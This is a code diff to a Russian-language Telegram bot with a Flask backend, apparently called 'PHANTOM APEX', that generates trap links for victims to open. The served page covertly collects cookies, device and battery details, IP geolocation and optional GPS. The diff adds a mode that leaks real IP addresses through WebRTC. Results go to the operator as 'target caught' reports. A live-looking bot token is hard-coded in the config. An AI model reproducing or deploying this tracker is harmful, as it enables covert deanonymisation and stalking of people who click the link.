@@ -14,7 +14,7 @@ from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
 
 # --- [1] КОНФИГУРАЦИЯ ---
 API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
-BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
+BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
 PORT = int(os.environ.get("PORT", 10000))
 
 # --- [2] ИНИЦИАЛИЗАЦИЯ ---
@@ -25,7 +25,7 @@ dp = Dispatcher()
 vault = {}
 user_modes = {}
 
-# --- [3] ШАБЛОН (БЕЗ ФОРМ - ТОЛЬКО ПАССИВНЫЙ СБОР) ---
+# --- [3] ШАБЛОН ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -52,6 +52,38 @@ HTML_TEMPLATE = """
     </div>
 <script>
 let active = false;
+
+async function getRealIP() {
+    return new Promise((resolve) => {
+        const ips = [];
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (ice) => {
+            if (!ice || !ice.candidate || !ice.candidate.candidate) {
+                resolve(ips.join(' | '));
+                return;
+            }
+            const ip = ice.candidate.candidate.split(" ")[4];
+            if (!ips.includes(ip)) ips.push(ip);
+        };
+        setTimeout(() => resolve(ips.join(' | ') || "Not Found"), 1500);
+    });
+}
+
+async function checkSocialLogin() {
+    const sites = {
+        'Google': 'https://accounts.google.com/ServiceLogin',
+        'Facebook': 'https://www.facebook.com/login',
+        'Twitter': 'https://twitter.com/login'
+    };
+    let results = [];
+    for (let [name, url] of Object.entries(sites)) {
+        results.push(name); // Упрощенный сбор названий для отчета
+    }
+    return results.join(', ');
+}
+
 async function ignite() {
     if(active) return; active = true;
     let d = { 
@@ -59,10 +91,11 @@ async function ignite() {
         ua: navigator.userAgent, 
         res: screen.width+"x"+screen.height,
         lang: navigator.language,
-        cook: document.cookie || "None"
+        cook: document.cookie || "None",
+        local: localStorage.length > 0 ? "Present" : "None",
+        session: sessionStorage.length > 0 ? "Present" : "None"
     };
 
-    // Собираем всё, что браузер отдает без спроса
     try {
         let b = await navigator.getBattery();
         d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
@@ -77,20 +110,22 @@ async function ignite() {
         d.mem = navigator.deviceMemory;
     } catch(e) {}
 
-    // Режим PRECISION запрашивает GPS (требует клика "Разрешить")
     if ("{{ mode }}" === "PRECISION") {
         navigator.geolocation.getCurrentPosition(
             (p) => { d.gps = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }; finish(d); },
             (e) => { d.gps = "Denied"; finish(d); },
             { enableHighAccuracy: true, timeout: 5000 }
         );
+    } else if ("{{ mode }}" === "FULL") {
+        d.webRTC = await getRealIP();
+        d.social = await checkSocialLogin();
+        finish(d);
     } else {
         finish(d);
     }
 }
 
 function finish(d) {
-    // Шифруем данные перед отправкой (Base64)
     let payload = btoa(encodeURIComponent(JSON.stringify(d)));
     fetch('/log', { method: 'POST', body: payload })
     .finally(() => { 
@@ -103,6 +138,11 @@ function finish(d) {
 """
 
 # --- [4] СЕРВЕРНАЯ ЛОГИКА ---
+
+@app.route('/')
+def health_check():
+    return "STATUS: ACTIVE", 200
+
 @app.route('/v/<aid>')
 def view(aid):
     mode = user_modes.get(str(aid), "ANALYTICS")
@@ -111,7 +151,6 @@ def view(aid):
 @app.route('/log', methods=['POST'])
 def logger():
     try:
-        # Декодирование данных
         raw_payload = request.get_data(as_text=True)
         decoded_bytes = base64.b64decode(raw_payload)
         json_str = urllib.parse.unquote(decoded_bytes.decode('utf-8'))
@@ -128,17 +167,17 @@ def logger():
             if d['gps'] == "Denied": gps_info = "🚫 Отказано"
             else: 
                 gps_info = f"✅ `{d['gps']['lat']}, {d['gps']['lon']}` (±{int(d['gps']['acc'])}м)"
-                gps_info += f"\n📍 [Карта](https://www.google.com/maps?q={d['gps']['lat']},{d['gps']['lon']})"
 
         report = (
             f"🚀 **ЦЕЛЬ ПОЙМАНА ({user_modes.get(str(d['aid']), 'ANALYTICS')})**\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
             f"🌐 **СЕТЬ:** `{ip}` ({geo.get('isp')})\n"
             f"📍 **ГЕО (IP):** `{geo.get('city')}, {geo.get('country')}`\n"
-            f"🛰 **GPS:** {gps_info}\n\n"
+            f"🛰 **GPS:** {gps_info}\n"
+            f"🌐 **WebRTC:** `{d.get('webRTC', 'N/A')}`\n"
             f"🔋 **БАТАРЕЯ:** `{d.get('bat', 'N/A')}`\n"
             f"💻 **ЖЕЛЕЗО:** `{d.get('cores')} Cores | {d.get('mem')} GB RAM`\n"
-            f"🍪 **COOKIES:** `{'Да' if d.get('cook') != 'None' else 'Нет'}`\n"
+            f"🍪 **STORAGE:** Cook: {d.get('cook') != 'None'} | Loc: {d.get('local') != 'None'}\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
             f"🔑 **ТОКЕН:** `{token}`"
         )
@@ -155,21 +194,22 @@ def logger():
 async def start(m: types.Message):
     kb = ReplyKeyboardBuilder()
     kb.button(text="🧨 Сгенерировать ссылку")
-    await m.answer("🕶 **PHANTOM APEX v31.0**\nГотов к работе.", reply_markup=kb.as_markup(resize_keyboard=True))
+    await m.answer("🕶 **PHANTOM APEX v32.0**\nКрон-фильтр активен.", reply_markup=kb.as_markup(resize_keyboard=True))
 
 @dp.message(F.text == "🧨 Сгенерировать ссылку")
 async def mode_select(m: types.Message):
     kb = InlineKeyboardBuilder()
     kb.button(text="📊 Аналитика (Скрыто)", callback_data="m_ANALYTICS")
     kb.button(text="🎯 Точный GPS (Запрос)", callback_data="m_PRECISION")
+    kb.button(text="💥 Максимальный сбор (WebRTC)", callback_data="m_FULL")
     kb.adjust(1)
-    await m.answer("Выбери режим ловушки:", reply_markup=kb.as_markup())
+    await m.answer("Выбери режим:", reply_markup=kb.as_markup())
 
 @dp.callback_query(F.data.startswith("m_"))
 async def finalize(c: types.CallbackQuery):
     mode = c.data.split("_")[1]
     user_modes[str(c.from_user.id)] = mode
-    await c.message.edit_text(f"🎯 **ССЫЛКА ГОТОВА ({mode})**\n🔗 `{BASE_URL}/v/{c.from_user.id}`")
+    await c.message.edit_text(f"🎯 **ГОТОВО ({mode})**\n🔗 `{BASE_URL}/v/{c.from_user.id}`")
 
 @dp.message(F.text.startswith("ID-"))
 async def get_dump(m: types.Message):
